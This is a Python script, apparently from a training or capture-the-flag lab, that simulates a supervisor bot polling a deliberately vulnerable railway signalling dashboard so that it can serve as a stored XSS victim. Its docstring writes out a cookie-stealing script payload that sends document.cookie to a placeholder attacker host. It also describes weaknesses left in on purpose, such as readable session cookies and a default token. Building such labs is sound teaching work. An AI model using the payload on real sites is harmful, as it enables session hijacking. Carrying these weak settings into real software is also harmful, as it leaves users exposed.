#!/usr/bin/env python3
"""
RailInfra — Automated Signalling Controller Bot
================================================
Simulates the automated supervisor account that continuously polls the
signalling dashboard to check signal and switch states.

This is the XSS victim. It runs as a background service (www-data),
authenticates to the Flask app using a shared bot token, and fetches
/dashboard on a regular interval. If an attacker has injected an XSS
payload into the signal_banner session variable, this bot will render
it — firing the payload and exfiltrating the supervisor session cookie
to the attacker's listener.

Attack chain step:
  Attacker submits via POST /signal:
    <script>fetch('http://ATTACKER_IP/?c='+document.cookie)</script>

  This bot fetches /dashboard ~every 10s with a supervisor session.
  SESSION_COOKIE_HTTPONLY=False means document.cookie is readable by JS.
  The bot's supervisor cookie is sent to the attacker's nc/HTTP listener.

Deployed by Ansible to: /opt/railinfra/bot.py
Runs as:                www-data (systemd unit: railinfra-bot.service)
Environment variables:  /etc/railinfra/webapp.env
"""

import os
import time
import random
import logging
import requests

# ---------------------------------------------------------------------------
# Configuration — injected by Ansible via /etc/railinfra/webapp.env
# Must match the BOT_TOKEN in app.py exactly.
# ---------------------------------------------------------------------------
BOT_TOKEN  = os.environ.get("BOT_TOKEN",  "dev-bot-token-changeme")
APP_URL    = os.environ.get("APP_URL",    "http://127.0.0.1:5000")
BOT_POLL   = int(os.environ.get("BOT_POLL", "10"))  # seconds between polls

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [bot] %(levelname)s %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
log = logging.getLogger("railinfra-bot")


def poll_dashboard(session: requests.Session) -> None:
    """
    Fetch /dashboard with the supervisor bot token.
    Flask's before_request hook converts the X-Bot-Token header into a
    real supervisor session, so document.cookie in any injected XSS
    payload will return a valid supervisor session cookie.
    """
    try:
        resp = session.get(
            f"{APP_URL}/dashboard",
            headers={"X-Bot-Token": BOT_TOKEN},
            timeout=5,
            allow_redirects=True,
        )
        log.info("dashboard poll → HTTP %s (%d bytes)", resp.status_code, len(resp.content))
    except requests.exceptions.ConnectionError:
        log.warning("dashboard poll failed — connection refused (app not ready?)")
    except requests.exceptions.Timeout:
        log.warning("dashboard poll timed out")
    except Exception as exc:
        log.error("unexpected error: %s", exc)


def main() -> None:
    log.info("RailInfra bot starting — polling %s every %ds", APP_URL, BOT_POLL)

    http = requests.Session()
    # Disable SSL verification (no TLS in this deployment)
    http.verify = False

    # Wait for the Flask app to be ready before starting polls
    for attempt in range(30):
        try:
            r = http.get(f"{APP_URL}/", timeout=3, allow_redirects=False)
            if r.status_code in (200, 302):
                log.info("app is ready — starting poll loop")
                break
        except Exception:
            pass
        log.info("waiting for app... attempt %d/30", attempt + 1)
        time.sleep(2)
    else:
        log.error("app never became ready — exiting")
        raise SystemExit(1)

    cycle = 0
    while True:
        cycle += 1
        log.info("cycle %d", cycle)
        poll_dashboard(http)

        # Jitter: sleep for BOT_POLL ± 20% so timing isn't perfectly regular
        jitter = BOT_POLL * 0.2
        sleep_time = BOT_POLL + random.uniform(-jitter, jitter)
        time.sleep(max(sleep_time, 1))


if __name__ == "__main__":
    main()
